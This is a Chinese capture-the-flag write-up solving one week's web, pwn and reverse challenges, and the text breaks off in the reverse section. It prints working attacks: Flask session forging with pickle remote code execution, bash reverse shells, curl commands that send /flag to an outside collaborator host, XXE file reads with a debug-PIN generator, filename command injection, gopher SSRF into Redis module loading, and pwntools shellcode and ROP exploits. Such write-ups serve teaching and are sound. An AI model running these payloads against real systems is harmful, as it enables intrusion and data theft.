拿到题目合约一眼就知道靠沉淀根本无法打败boss，于是可以先攻击21次，虽然每次都会失败，但是第21次攻击完之后勇者的等级就会因为下溢来到最高，这时就可以轻松打败boss，由于最后还有一个检验等级是否低于boss，因此还需要沉淀一次来让等级上溢回到0级

## Week 3

### Web

#### notebook

https://www.leavesongs.com/PENETRATION/client-session-security.html

首先得知道 flask 的 session 信息存储在 cookie 中, 因此这种 session 也被称作 "客户端 session"

而 session 要想保证不被恶意修改, 就会使用一个 secret key 进行签名

注意 "签名" 不等于 "加密", 我们其实仍然能够看到 session 中存储的信息, 但是无法修改它, 这一点和 JWT (JSON Web Token) 类似

题目中的 secret key

```python
app.config['SECRET_KEY'] = os.urandom(2).hex()
```

这里留了个随机数主要是让大家关注随机数的长度, 如果这个长度过小, 那么很容易就能爆破出来

一部分人可能不知道它长度是多少, 这个其实放到 python 里面运行一下就知道了, 只有 4 位

然后因为是 hex, 所以只会出现 `0123456789abcdef` 这些字符

先手动生成一个四位数字典

```python
import itertools

d = itertools.product('0123456789abcdef', repeat=4)

with open('dicts.txt', 'w') as f:
    for i in d:
        s = ''.join(i)
        f.write(s + '\n')
```

然后找一些现成的工具

https://github.com/noraj/flask-session-cookie-manager

https://github.com/Paradoxis/Flask-Unsign

以 flask-unsign 为例

```bash
flask-unsign -u -c 'eyJub3RlcyI6e319.ZRaiVg.28tEyvEpXfcjFl5rrQ7K_nkl208' -w dicts.txt --no
-literal-eval
```

结果

```bash
[*] Session decodes to: {'notes': {}}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 30208 attempts
b'75c5'
```

然后是个简单的 pickle 反序列化漏洞, 没有任何过滤

```python
@app.route('/<path:note_id>', methods=['GET'])
def view_note(note_id):
    notes = session.get('notes')
    if not notes:
        return render_template('note.html', msg='You have no notes')
    
    note_raw = notes.get(note_id)
    if not note_raw:
        return render_template('note.html', msg='This note does not exist')
    
    note = pickle.loads(note_raw)
    return render_template('note.html', note_id=note_id, note_name=note.name, note_content=note.content)
```

控制 notes 为我们的恶意 pickle 序列化数据即可

这里有几个注意点

首先, 如果你使用 `pickle.dumps()` 来生成 payload, 那么你得知道不同操作系统生成的 pickle 序列化数据是有区别的

参考: https://xz.aliyun.com/t/7436

```python
# Linux (注意 posix)
b'cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'

# Windows (注意 nt)
b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
```

在 Windows 上生成的 pickle payload 无法在 Linux 上运行

当然如果手动去构造 opcode, 那是没有这个问题的, 比如这段 opcode

```python
b'''cos
system
(S'whoami'
tR.'''
```

其次, 很多人过来问为什么构造了恶意 pickle 序列化数据发送之后服务器报错 500, 其实这个是正常现象, 没啥问题

上面代码在 `pickle.loads()` 之后得到 note 对象, 然后访问它的 id, name, content 属性, 即 `note.id`, `note.name`, `note.content`

如果是正常的 pickle 数据, 那么服务器就会显示正常的 note 内容

如果是恶意的 pickle 数据, 那么 `pickle.loads()` 返回的就是通过 `__reduce__` 方法调用的某个函数所返回的结果, 根本就没有 id, name, content 这些属性, 当然就会报错了

```python
import pickle

class A:
  def __reduce__(self):
    return (str, ("123", ))
  
s = pickle.dumps(A(), protocol=0)
obj = pickle.loads(s)
print(obj) # 123
```

换成 `os.system()` 同理, 在 Linux 中通过这个函数执行的命令, 如果执行成功, 则返回 0, 否则返回非 0 值

虽然服务器会报错 500, 但命令其实还是执行成功的

然后, 也有一部分人问为什么没有回显? 为什么反弹 shell 失败?

首先为什么没有回显我上面已经说了, 而且就算 `os.system()` 有回显你也看不到, 因为回显的内容根本就不会在网页上输出

至于为什么反弹 shell 失败, 提示 `sh: 1: Syntax error: Bad fd number.`, 很多人用的都是这个命令

```bash
bash -i >& /dev/tcp/host.docker.internal/4444 0>&1
```

这个命令存在一些注意点, 首先得理解 bash 反弹 shell 的本质

[https://www.k0rz3n.com/2018/08/05/Linux反弹shell（一）文件描述符与重定向/](https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/)

[https://www.k0rz3n.com/2018/08/05/Linux反弹shell（二）反弹shell的本质/](https://www.k0rz3n.com/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/)

然后你得知道上面这个反弹 shell 的语法其实是 bash 自身的特性, 而其它 shell 例如 sh, zsh 并不支持这个功能

对于题目的环境而言, 当你执行这条命令的时候, 它实际上是在 sh 的 context 中执行的, `>&` 以及 `/dev/tcp/IP/Port` 会被 sh 解析, 而不是 bash, 因此会报错

解决方法也很简单, 将上面的命令使用 `bash -c ""` 包裹起来, 即

```bash
bash -c "bash -i >& /dev/tcp/host.docker.internal/4444 0>&1"
```

让 `>&` 以及 `/dev/tcp/IP/Port` 都被 bash 解析, 就能反弹成功了

而且题目有 python 环境, 用 `python -c "xxx"` 反弹 shell 也行

更何况这题也不是非要反弹 shell, 还有很多其它方法也可以外带回显, 例如 dnslog / Burp Collaborator

```bash
curl i2l42u09eonlu596rrno58j5xw3nrff4.oastify.com -T /flag
curl i2l42u09eonlu596rrno58j5xw3nrff4.oastify.com -X POST -d "`cat /flag`"
```

最后构造 payload, 注意 note id 要对上

```bash
flask-unsign --sign --cookie "{'notes': {'evil': b'''cos\nsystem\n(S'bash -c \"bash -i >& /dev/tcp/host.docker.internal/4444 0>&1\"'\ntR.'''}}" --secret 6061 --no-literal-eval
```

![image-20230929191138796](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207506.png)

#### rss_parser

etree.parse 的过程存在 XXE 漏洞

```python
etree.parse(BytesIO(content), etree.XMLParser(resolve_entities=True))
```

将一个符合 RSS Feed XML 标准的 payload 放到 HTTP 服务器上就可以 XXE (也可以参考 `https://exp10it.cn/index.xml` 改一改)

但是无法直接读取 /flag 文件, 这里考察获取 Flask 在 Debug 模式下的 PIN Code 以实现 RCE

https://xz.aliyun.com/t/8092

https://www.tr0y.wang/2022/05/16/SecMap-flask/

读取 `/sys/class/net/eth0/address`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY file SYSTEM "file:///sys/class/net/eth0/address">]>
<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>&file;</title>
        <link>https://exp10it.cn/</link>
        <item>
            <title>test</title>
            <link>https://exp10it.cn/</link>
        </item>
    </channel>
</rss>
```

结果

```
02:42:c0:a8:e5:02
```

转换为十进制

```python
int('02:42:c0:a8:e5:02'.replace(':',''),16)
```

结果为 `2485723391234`

然后读取 machine id 或者 boot id

因为这里不存在 `/etc/machine-id`, 所以读取 `/proc/sys/kernel/random/boot_id`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY file SYSTEM "file:///proc/sys/kernel/random/boot_id">]>
<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>&file;</title>
        <link>https://exp10it.cn/</link>
        <item>
            <title>test</title>
            <link>https://exp10it.cn/</link>
        </item>
    </channel>
</rss>
```

结果

```
d0bb4e23-acae-4f09-a9a9-e13f710e25fa
```

然后根据上面的文章, 读取 `/proc/self/cgroup` 显示 `0::/`, 也就是没有 id 值, 所以不用拼接, 直接用上面的 boot id 就行

剩下的 username 可以通过读取 `/etc/passwd` 来猜一下, 一般都是 `root` 或者最底下的用户 `app`, 多试几个就行

最后随便填一个 url, 比如 `https://exp10it.cn/xxx` 就能在报错页面看到 flask 的路径

exp (注意新版本 flask 计算 pin code 时用的是 sha1, 旧版本才是 md5)

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'app'# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.9/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485723391234',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'd0bb4e23-acae-4f09-a9a9-e13f710e25fa'# get_machine_id(), /etc/machine-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)
```

然后进入报错页面输入 PIN Code

![image-20230930154731225](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207096.png)

直接执行 `/readflag` 命令拿到 flag

![image-20230930154844781](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207844.png)

这题不知道为啥做出来的人很少, 其实也不难

如果自己没有服务器放 xxe payload 的话可以借助一些免费的对象存储, 例如腾讯云的 COS 和阿里云的 OSS 服务, 或者用 ngrok 等工具将本机映射到公网也行

#### zip_manager

题目实现了在线解压缩 zip 文件的功能, 但是不能进行目录穿越

这里有两种利用方式: zip 软链接和命令注入

先讲第一种

众所周知 Linux 存在软链接这一功能, 而 zip 支持压缩软链接, 程序又是用 unzip 命令进行解压缩, 因此会存在这个漏洞 (相比之下如果使用 Python 的 zipfile 库进行解压缩, 就不会存在这个问题)

```bash
ln -s / test
zip -y test.zip test
```

上传后访问 `http://127.0.0.1:50033/test/test/`

![image-20230930160801834](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207518.png)

然后直接下载 flag 即可

再看第二种

```python
@app.route('/unzip', methods=['POST'])
def unzip():
    f = request.files.get('file')
    if not f.filename.endswith('.zip'):
        return redirect('/')

    user_dir = os.path.join('./uploads', md5(request.remote_addr))
    if not os.path.exists(user_dir):
        os.mkdir(user_dir)

    zip_path = os.path.join(user_dir, f.filename)
    dest_path = os.path.join(user_dir, f.filename[:-4])
    f.save(zip_path)

    os.system('unzip -o {} -d {}'.format(zip_path, dest_path))
    return redirect('/')
```

调用 os.system 执行 unzip 命令, 但是路径是直接拼接过去的, 而 zip 的文件名又可控, 这里存在一个很明显的命令注入

burp 上传时抓包把 filename 改成下面的命令即可 (base64 的知识点在第一周的 writeup 里面就提到过)

```bash
test.zip;echo Y3VybCBob3N0LmRvY2tlci5pbnRlcm5hbDo0NDQ0IC1UIC9mbGFnCg==|base64 -d|bash;1.zip
```

![image-20230930161419225](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207772.png)

命令注入这个点其实跟第一周的 ping 类似, 只不过换了一种形式

#### web_snapshot

题目会通过 curl 函数请求网页, 并将 html 源码保存在 Redis 数据库中

请求网页的过程很明显存在 ssrf, 但是限制输入的 url 只能以 http / https 开头

```php
function _get($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $data = curl_exec($curl);
    curl_close($curl);
    return $data;
}
```

这题可能出的有点难了, 因此后面给了一些 hint

首先注意 `curl_setopt` 设置的参数 `CURLOPT_FOLLOWLOCATION`, 代表允许 curl 根据返回头中的 Location 进行重定向

参考: https://www.php.net/manual/zh/function.curl-setopt.php

![image-20230930162418965](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207504.png)

![image-20230930162447209](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207029.png)

![image-20230930162512479](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207958.png)

而 curl 支持 dict / gopher 等协议, 那么我们就可以通过 Location 头把协议从 http 重定向至 dict / gopher, 这个技巧在一些关于 ssrf 的文章里面也会提到

结合 redis 的知识点, 可以尝试 redis 主从复制 rce

https://www.cnblogs.com/xiaozi/p/13089906.html

https://github.com/Dliv3/redis-rogue-server

payload

```python
import requests
import re

def urlencode(data):
    enc_data = ''
    for i in data:
        h = str(hex(ord(i))).replace('0x', '')
        if len(h) == 1:
            enc_data += '%0' + h.upper()
        else:
            enc_data += '%' + h.upper()
    return enc_data

def gen_payload(payload):

    redis_payload = ''

    for i in payload.split('\n'):
        arg_num = '*' + str(len(i.split(' ')))
        redis_payload += arg_num + '\r\n'
        for j in i.split(' '):
            arg_len = '$' + str(len(j))
            redis_payload += arg_len + '\r\n'
            redis_payload += j + '\r\n'

    gopher_payload = 'gopher://db:6379/_' + urlencode(redis_payload)
    return gopher_payload

payload1 = '''
slaveof host.docker.internal 21000
config set dir /tmp
config set dbfilename exp.so
quit
'''

payload2 = '''slaveof no one
module load /tmp/exp.so
system.exec 'env'
quit
'''

print(gen_payload(payload1))
print(gen_payload(payload2))
```

分两次打

```php
<?php

// step 1
header('Location: gopher://db:6379/_%2A%31%0D%0A%24%30%0D%0A%0D%0A%2A%33%0D%0A%24%37%0D%0A%73%6C%61%76%65%6F%66%0D%0A%24%32%30%0D%0A%68%6F%73%74%2E%64%6F%63%6B%65%72%2E%69%6E%74%65%72%6E%61%6C%0D%0A%24%35%0D%0A%32%31%30%30%30%0D%0A%2A%34%0D%0A%24%36%0D%0A%63%6F%6E%66%69%67%0D%0A%24%33%0D%0A%73%65%74%0D%0A%24%33%0D%0A%64%69%72%0D%0A%24%34%0D%0A%2F%74%6D%70%0D%0A%2A%34%0D%0A%24%36%0D%0A%63%6F%6E%66%69%67%0D%0A%24%33%0D%0A%73%65%74%0D%0A%24%31%30%0D%0A%64%62%66%69%6C%65%6E%61%6D%65%0D%0A%24%36%0D%0A%65%78%70%2E%73%6F%0D%0A%2A%31%0D%0A%24%34%0D%0A%71%75%69%74%0D%0A%2A%31%0D%0A%24%30%0D%0A%0D%0A');

// step 2
// header('Location: gopher://db:6379/_%2A%33%0D%0A%24%37%0D%0A%73%6C%61%76%65%6F%66%0D%0A%24%32%0D%0A%6E%6F%0D%0A%24%33%0D%0A%6F%6E%65%0D%0A%2A%33%0D%0A%24%36%0D%0A%6D%6F%64%75%6C%65%0D%0A%24%34%0D%0A%6C%6F%61%64%0D%0A%24%31%31%0D%0A%2F%74%6D%70%2F%65%78%70%2E%73%6F%0D%0A%2A%32%0D%0A%24%31%31%0D%0A%73%79%73%74%65%6D%2E%65%78%65%63%0D%0A%24%35%0D%0A%27%65%6E%76%27%0D%0A%2A%31%0D%0A%24%34%0D%0A%71%75%69%74%0D%0A%2A%31%0D%0A%24%30%0D%0A%0D%0A');
```

在 vps 上启动一个 php 服务器, 例如 `php -S 0.0.0.0:65000`, 然后让题目去访问这个 php 文件

![image-20230930163412501](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207478.png)

第二次打完之后, 访问给出的 link 拿到回显

```
http://127.0.0.1:50034/cache.php?id=f56f89a264510e2b3aee8461a9859812
```

![image-20230930163502985](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207909.png)

这里得注意几个点

首先 gopher 得分两次打, 不然你在执行 `slaveof IP Port` 命令之后又立即执行了 `slave of no one`, 这就导致根本没有时间去主从复制 exp.so

其次在使用 gopher 发送 redis 命令的时候记得结尾加上 `quit`, 不然会一直卡住

然后注意 redis 的主机名是 `db`, 而不是 `127.0.0.1`, 因此访问 redis 数据库得用 `db:6379`

如果用 dict 协议打的话, 得调整一下 payload 顺序

```
dict://db:6379/config:set:dir:/tmp
dict://db:6379/config:set:dbfilename:exp.so
dict://db:6379/slaveof:host.docker.internal:21000
dict://db:6379/module:load:/tmp/exp.so
dict://db:6379/slave:no:one
dict://db:6379/system.exec:env
dict://db:6379/module:unload:system
```

因为每次执行命令之间会存在一定的时间间隔, 所以得先设置 dir 和 dbfilename, 然后再 slaveof, 不然最终同步的文件名和路径还是原来的 `/data/dump.rdb`

#### GoShop

题目是一个商店, 初始 money 为 100, 需要购买金额为 999999999 的 flag 商品后才能拿到 flag

往 number 里面填负数或者小数这种思路都是不行的, 需要仔细看代码的逻辑

BuyHandler

```go
func BuyHandler(c *gin.Context) {
	s := sessions.Default(c)
	user := users[s.Get("id").(string)]

	data := make(map[string]interface{})
	c.ShouldBindJSON(&data)

	var product *Product

	for _, v := range products {
		if data["name"] == v.Name {
			product = v
			break
		}
	}

	if product == nil {
		c.JSON(200, gin.H{
			"message": "No such product",
		})
		return
	}

	n, _ := strconv.Atoi(data["num"].(string))

	if n < 0 {
		c.JSON(200, gin.H{
			"message": "Product num can't be negative",
		})
		return
	}

	if user.Money >= product.Price*int64(n) {
		user.Money -= product.Price * int64(n)
		user.Items[product.Name] += int64(n)
		c.JSON(200, gin.H{
			"message": fmt.Sprintf("Buy %v * %v success", product.Name, n),
		})
	} else {
		c.JSON(200, gin.H{
			"message": "You don't have enough money",
		})
	}
}
```

程序使用了 `strconv.Atoi(data["num"].(string))` 将 json 传递的 num 字符串转换成了 int 类型的变量 n

后面判断用户的 money 时将其转换成了 int64 类型, 而 product.Price 本身也是 int64 类型

```go
if user.Money >= product.Price*int64(n) {
  user.Money -= product.Price * int64(n)
  user.Items[product.Name] += int64(n)
  c.JSON(200, gin.H{
    "message": fmt.Sprintf("Buy %v * %v success", product.Name, n),
  })
} else {
  c.JSON(200, gin.H{
    "message": "You don't have enough money",
  })
}
```

这里先介绍一些概念

Go 语言是强类型语言, 包含多种数据类型, 以数字类型为例, 存在 uint8 uint16 uint32 uint64 (无符号整型) 和 int8 int16 int32 int64 (有符号整型) 等类型

Go 语言在编译期会检查源码中定义的变量是否存在溢出, 例如 `var i uint8 = 99999` 会使得编译不通过, 但是并不会检查变量的运算过程中是否存在溢出, 例如 `var i uint8 = a * b`, 如果程序没有对变量的取值范围做限制, 那么在部分场景下就可能存在整数溢出漏洞

上面的 BuyHandler 虽然限制了 n 不能为负数, 但是并没有限制 n 的最大值

因此我们可以控制 n, 使得 `product.Price * int64(n)` 溢出为一个负数, 之后进行 `user.Money -= product.Price * int64(n)` 运算的时候, 当前用户的 money 就会增加, 最终达到一个可以购买 flag 商品的金额, 从而拿到 flag

查阅相关文档可以知道 int64 类型的范围是 `-9223372036854775808 ~ 9223372036854775807`

经过简单的计算或者瞎猜, 可以购买数量为 `922337203695477808` 的 apple

![image-20230930165439162](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207038.png)

最终购买 flag

![image-20230930165503456](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207723.png)

### Pwn

#### all-in-files

主要想介绍一下linux的文件描述符，还需要注意一下发文件名的时候需要用send不能sendline

```py
from pwn import *
#s=process("./fd")
s=remote("192.168.3.253",53000)
s.sendafter(b"open: ",b"/flag")
s.sendlineafter(b"from: ",b"1")
s.sendlineafter(b"to: ",b"2")
s.interactive()
```

写到stderr而不写到stdin的原因是~~它没关~~高版本下stdin只读，原因不明。

然后有人来问才发现read的时候直接用的open返回的fd，之前输入的in_fd根本没用上。~~不愧是签到题，更简单了~~

#### shellcode, but FOP

> 毕竟是CTF，我们还是要面向flag编程的，对吧，对吧~

主要是开了沙盒，不能用execve，不能拿shell了。

但结论要看目的，你的目的是拿flag，那还能抢救。

我们考虑orw，open-read-write，把flag文件打开，把文件内容读取到内存中，然后再写出来。

具体到哪取决于具体情况，对于本题来说。

这里文件名加了随机，我们还要了解一下怎么通过系统调用来获取当前目录下的所有文件。

用`getdents64`系统调用获取当前目录下文件，然后遍历`dirent64`结构体即可。

手搓shellcode的经验需要慢慢积累，不用急。

```py
from pwn import *
context(arch="amd64",os="linux",log_level="debug")
#s=process("../dist/ret2shellcode-revenge")
s=remote("192.168.3.253",53001)
#sc=shellcraft.open("flag")+shellcraft.read(3,0x20230000,0x100)+shellcraft.write(1,0x20230000,0x100)
pause()
sc="""
xor rdi,rdi
xor dl,dl
push rdx
pop rsi
syscall  # first read()
"""
sc2="""
push rsi
pop rdi
xor rsi,rsi
xor rdx,rdx
push 2
pop rax
syscall   # open
push rdi
pop rsi
add rsi,0x500
push rax
pop rdi
inc dh
push SYS_getdents64
pop rax
syscall   # getdents64

push rsi
pop r12                      # r12 = current linux_dirent64

jmp loop
loop_start:
xor r13,r13
mov r13w, word ptr [r12+0x10] # next linux_dirent64 offset
cmp dword ptr [r12+0x13], 0x67616c66 # "flag"
jz start_orw
add r12, r13                 # r13 = next linux_dirent64

loop:
cmp qword ptr [r12+8],0
jz finish
jmp loop_start


start_orw:
push r12
pop rdi
add rdi,0x13
xor rsi,rsi
push rsi;pop rdx
push 2;pop rax
syscall      # open flag
push rax
pop rdi
push r12
pop rsi
add rsi,0x100
inc dh
xor rax,rax
syscall      # read flag content to buf
push 2;pop rdi
push rdi;pop rax
dec rax
syscall      # write flag content to stderr
push 1
pop rax
push r12
pop rsi
add rsi,0x13
syscall      # write flag name to stderr

finish:
push 0x3c
pop rax
syscall      # exit

"""
s.sendafter(b"code:\n",asm(sc).rjust(0x100,b"\x90"))
s.send(b".\x00".ljust(0x100,b"\x90")+asm(sc2))
s.interactive()

```

<!--
一位更秀的师傅直接用shellcode实现了有ls和cat的shell。

在征求过他的同意之后这里也贴一下他的shellcode。
```py
```
-->

#### fmt3

无限次fmt写ROP链，没啥好说的。

```py
from pwn import *
context(os="linux",arch="amd64",log_level="debug")
work_path="../dist/"
elf_name="fmt3"
libc_name="libc.so.6"
remote_addr="192.168.3.253"
remote_port=52002
elf_path=work_path+elf_name
libc_path=work_path+libc_name

if remote_addr!="": s=remote(remote_addr,remote_port)
else: s=process(elf_path)
elf=ELF(elf_path)
if libc_name!="": libc=ELF(libc_path)
def fmtstring(prev,word,index):
    if word==prev:
        result=0
        fmtstr=""
    elif word==0:
        result=256-prev
        fmtstr=f"%{result}c"
    elif prev<word:
        result=word-prev
        fmtstr=f"%{result}c"
    elif prev>word:
        result=256-prev+word
        fmtstr=f"%{result}c"
    fmtstr+=f"%{index}$hhn"
    return [fmtstr.encode(),result]
def fmt64(offset,original_offset,addr,content,inner=False):
    payloada=b""
    prev=0
    i=0
    if content==0:
        payload=f"%{offset+1}$lln".encode().ljust(8,b"A")+p64(addr)
        return payload
    while (content>>(i*8))>0:
        retl=fmtstring(prev,(content>>i*8)&0xff,offset+i)
        payloada+=retl[0]
        prev+=retl[1]
        prev&=0xff
        i+=1
    while len(payloada)%8!=0:
        payloada+=b"a"
    if offset==original_offset+len(payloada)/8 and inner:
        return payloada
    payload=fmt64(offset+1,original_offset,addr,content,True)
    if inner:
        return payload
    for ii in range(i):
        payload+=p64(addr+ii)
    return payload
def send_fmt(content,flag=False,exit_flag=False):
    s.sendlineafter(b"content: ",content)
    if flag:
        dat=s.recvline()[:-1]
    if exit_flag:
        s.sendafter(b"more?\n",b"n")
    else:
        s.sendafter(b"more?\n",b"y")
    if flag:
        return dat


if __name__=="__main__":
    dat=send_fmt(b"%40$p.%36$p.%30$p.",flag=True).split(b".")
    rbp=eval(dat[0])-0xf0+8
    libc.address=eval(dat[1])-(0x7ffff7fba2e8-0x7ffff7dc9000)
    elf.address=eval(dat[2])-0x40
    success(hex(rbp))
    success(hex(libc.address))
    success(hex(elf.address))
    addr_l=[]
    for i in range(6):
        addr_l.append(rbp+i*8)
    content_l=[libc.address+0x0000000000023b63,0,0,0,0,libc.address+0xe3afe]
    for i in range(len(addr_l)-1):
        send_fmt(fmt64(8,8,addr_l[i],content_l[i]))
    send_fmt(fmt64(8,8,addr_l[5],content_l[5]),exit_flag=True)
    s.interactive()
```

#### shellcode, but without syscall.

主要提一下`fini_array`，程序退出时执行存在其中的函数指针。

还有让大伙看一眼静态编译出来的程序长什么样子（

但我在出题测试的时候发现只有`NO RELRO`情况下`fini array`才可写，如此一来意义也就不大了。

shellcode部分的话，`xor qword ptr [rip], #imm`造syscall，或者找个libc相关地址算一下`syscall;ret`的gadget然后`call`过去都行。

```py
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
def pwns():
    #s=process("../dist/pwns")
    #pause()
    s=remote("192.168.3.253",53003)
    s.sendlineafter(b"length:\n",b"32")
    shellcodes="""
    xor rax,rax
    mov esi,0x20230000
    xor dword ptr [rip],0x9f
    nop
    """
    s.sendafter(b"code:\n",asm(shellcodes)+b"\x05")
    s.sendlineafter(b"Where?\n",b"4DB038")
    s.sendafter(b"What?\n",p64(0x20230000))
    s.send(b"\x90"*0x20+asm(shellcraft.sh()))
    s.interactive()

if __name__=="__main__":
    pwns()
```

#### 没了溢出，你能秒我？

并不算裸的栈迁移。

输入函数存在多写1byte `b"\x00"`的漏洞，在经过vuln和main两个函数的`leave;ret`之后，rsp会指向被我们低位写0的rbp，这个值会比本来的rbp小，因此可以抬栈。

如此一来我们就可以先行在栈中布置ROP链，然后赌rbp的最低一位足够大，写0之后可以给我们充足的栈空间用来ROP。

至于它最后rsp指向栈中什么位置我们并不需要关心，直接把ROP链放在后面，前面塞满ret，只要你hit到一个ret就能让他滑到末尾（跟第一周shellcode前面塞满nop是一个思路）。

可以试着挂个gdb调一调。

然后就是常规ret2libc。

```py
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#s=process("./poison-rbp")
s=remote("192.168.3.253",52004)
elf=ELF("../dist/poison-rbp")
libc=ELF("../dist/libc.so.6")

rdi=0x0000000000401393
p=flat([
    rdi,elf.got['puts'],
    elf.plt['puts'],
    elf.sym.main,
])
while len(p)!=0x100:
    p=p64(rdi+1)+p
s.sendafter(b"Try perform ROP!\n",p)
s.recvline()
libc.address=u64(s.recvline()[:-1].ljust(8,b'\x00'))-libc.sym.puts
success(hex(libc.address))

p=flat([
    0x000000000040138c,0,0,0,0,
    libc.address+0xe3afe,
])
while len(p)!=0x100:
    p=p64(rdi+1)+p
s.sendafter(b"Try perform ROP!\n",p)
s.recvline()
s.interactive()
```

### Reverse

本周的Reverse挑战全是关于**Java**或**Android**(不含SO)题型，为了解决这些问题，我们将使用 [JADX](https://github.com/skylot/jadx/releases) 工具来进行反编译和分析。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717305047.png)

#### 代码启示录

首先，我们得到题目后，将 jar 文件拖入到 JADX 中，以便分析其内部逻辑。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717305867.png)

通过反编译 **Main** 类，我们可以清晰地看到程序的逻辑以及隐藏的 **flag**。

#### 旋转密码城

与上面类似，我们将 jar 文件拖入到 JADX 中，并开始分析其代码逻辑。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717310569.png)

在 **Main** 类中，我们发现程序会将用户输入通过 **CaesarPlus** 函数处理后与内置值进行比较。而 **CaesarPlus** 函数实质上是在 ASCII 表的可打印范围内，对输入字符右移47位，也就是常说的 **ROT47** 算法。我们可以使用 [CyberChef](https://gchq.github.io/CyberChef/) 工具来解密内置值，得到 **flag**。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717311184.png)

#### 数字幽灵城

在本题中，我们将 apk 文件拖入到 JADX 中进行分析。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717311872.png)

反编译 **MainActivity** 类后，我们发现程序会从资源中获取编码后的 **flag**，然后进行 **BASE58** 解码，并将解码结果利用 **SharedPreferences** 进行存储。之后，程序会将用户的输入与已存储的 **flag** 进行比较。

继续分析 **Base58** 类，我们可以更好地理解 **BASE58** 的解码逻辑。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717312418.png)

在找到资源中 **encodedFlag** 的值后，

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717313145.png)

我们可以使用 **BASE58** 的码表和程序内储存的 **encodedFlag**，进行 **BASE58** 解码，以获取 **flag**。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717313715.png)

#### 变量迷城

在这道题目中，我们同样将 jar 文件拖入到 JADX 中，准备进行分析。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717314423.png)

反编译 **Main** 类后，我们可以看到程序的逻辑，它会读取环境变量 **x** 和 **y**，以及属性 **brand**。要求 **brand** 等于 **0xGame**，并且 **x** 和 **y** 需要满足以下方程组：

\[x^2 + 2y^2 + 3x + 4y = 7384462351178\]

\[5x^2 + 6y^2 + 7x + 8y = 22179606057658\]

我们可以编写一个 **python** 脚本来解决这个方程组。

```python
from sympy import symbols, Eq, solve

x, y = symbols('x y')

eq1 = Eq(x**2 + 2*y**2 + 3*x + 4*y, 7384462351178)

eq2 = Eq(5*x**2 + 6*y**2 + 7*x + 8*y, 22179606057658)

solutions = solve((eq1, eq2), (x, y))
print(solutions)
```

运行结果如下：

```text
